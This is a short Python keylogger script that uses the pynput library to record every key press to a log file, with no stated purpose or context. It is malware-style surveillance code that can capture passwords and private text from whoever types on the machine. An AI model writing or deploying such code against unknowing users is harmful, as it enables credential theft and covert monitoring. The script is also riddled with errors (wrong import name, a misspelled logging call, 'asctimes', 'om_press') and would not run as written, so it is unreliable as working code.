from pynput.keyboard import key, Listener
import logging

log_dir=""

logging.basic.Config(filename=(log_dir+"key_log.txt"),level=logging.DEBUG,format='%(asctimes)s:%(message)s')

def on_press(key):
    logging.info(str(Key))
    
with Listener(om_press=on_press) as listener:
    listener.join()
